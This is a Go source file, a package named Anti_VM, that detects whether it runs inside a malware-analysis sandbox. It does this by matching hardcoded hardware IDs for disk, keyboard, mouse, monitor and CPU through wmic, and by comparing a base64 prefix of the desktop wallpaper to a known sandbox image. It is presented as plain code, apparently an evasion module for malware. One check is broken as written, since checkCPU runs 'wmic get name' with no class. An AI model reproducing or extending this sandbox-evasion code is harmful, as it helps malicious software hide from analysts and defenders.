package Anti_VM

import (
	"bytes"
	"encoding/base64"
	"io/ioutil"
	"os/exec"
	"strings"
)

const (
	MouseID   = "ACPI\\PNP0F13\\4&22F5829E&0"
	MouseName = "PS2/2 Compatible Mouse"

	InputID   = "USB\\VID_0627&PID_0001\\28754-0000:00:04.0-1"
	InputName = "USB Input Device"

	MonitorID   = "DISPLAY\\RHT1234\\4&22F5829E&0"
	MonitorName = "Generic PnP Monitor"

	DiskID   = "232138804165"
	DiskName = "WDC WDS100T2B0A"

	KeyboardID   = "ACPI\\PNP0303\\4&22F5829E&0"
	KeyboardName = "Standard PS/2 Keyboard"

	CPU = "Intel Core Processor (Broadwell)"
)

func checkDiskdrive() (bool, int) {
	var Index int
	cmd := exec.Command("wmic", "diskdrive", "get", "model,serialnumber")
	output, _ := cmd.CombinedOutput()

	if strings.Contains(string(output), DiskName) {
		Index++
		if strings.Contains(string(output), DiskID) {
			Index++
		}
	}

	return Index >= 1, Index
}

func checkKeyboard() (bool, int) {
	var Index int
	cmd := exec.Command("wmic", "path", "Win32_Keyboard", "get", "Description,DeviceID")
	output, _ := cmd.CombinedOutput()

	if strings.Contains(string(output), KeyboardID) {
		Index++
		if strings.Contains(string(output), KeyboardName) {
			Index++
		}
	}

	return Index >= 1, Index
}

func checkMouse() (bool, int) {
	var Index int
	cmd := exec.Command("wmic", "path", "Win32_PointingDevice", "get", "Description,PNPDeviceID")
	output, _ := cmd.CombinedOutput()

	if strings.Contains(string(output), MouseID) {
		Index++
		if strings.Contains(string(output), MouseName) {
			Index++
		}
	}

	return Index >= 1, Index
}

func checkInput() (bool, int) {
	var Index int
	cmd := exec.Command("wmic", "path", "Win32_PointingDevice", "get", "Description,PNPDeviceID")
	output, _ := cmd.CombinedOutput()

	if strings.Contains(string(output), InputID) {
		Index++
		if strings.Contains(string(output), InputName) {
			Index++
		}
	}

	return Index >= 1, Index
}

func checkMonitor() (bool, int) {
	var Index int
	cmd := exec.Command("wmic", "path", "Win32_DesktopMonitor", "get", "Description,PNPDeviceID")
	output, _ := cmd.CombinedOutput()

	if strings.Contains(string(output), MonitorID) {
		Index++
		if strings.Contains(string(output), MonitorName) {
			Index++
		}
	}

	return Index >= 1, Index
}

func checkCPU() (bool, int) {
	var Index int
	cmd := exec.Command("wmic", "get", "name")
	output, _ := cmd.CombinedOutput()

	if strings.Contains(string(output), CPU) {
		Index++
	}

	return Index >= 1, Index
}

func getWallpaper() (string, error) {
	cmd := exec.Command("powershell", "-command", "(Get-ItemProperty 'HKCU:\\Control Panel\\Desktop').Wallpaper")
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

func EncodeToBase64(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func ReadImage(filePath string) ([]byte, error) {
	return ioutil.ReadFile(filePath)
}

func TruncateBase64(base64String string) string {
	if len(base64String) > 64 {
		return base64String[:64] // Get only the first 64 characters
	}
	return base64String
}

func Triage() bool {
	checks := []func() (bool, int){
		checkDiskdrive,
		checkKeyboard,
		checkMouse,
		checkInput,
		checkMonitor,
		checkCPU,
	}

	totalIndex := 0
	for _, check := range checks {
		_, index := check()
		totalIndex += index
	}

	return totalIndex >= 5
}

func TriageV2() bool {
	wallpaperPath, _ := getWallpaper()
	wallpaperPath = string(bytes.TrimSpace([]byte(wallpaperPath)))
	imageBytes, _ := ReadImage(wallpaperPath)
	base64String := EncodeToBase64(imageBytes)
	truncatedBase64 := TruncateBase64(base64String)
	return truncatedBase64 == "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAwMDAwMDA0ODg0SExETEhsYFhYYGygd"
}
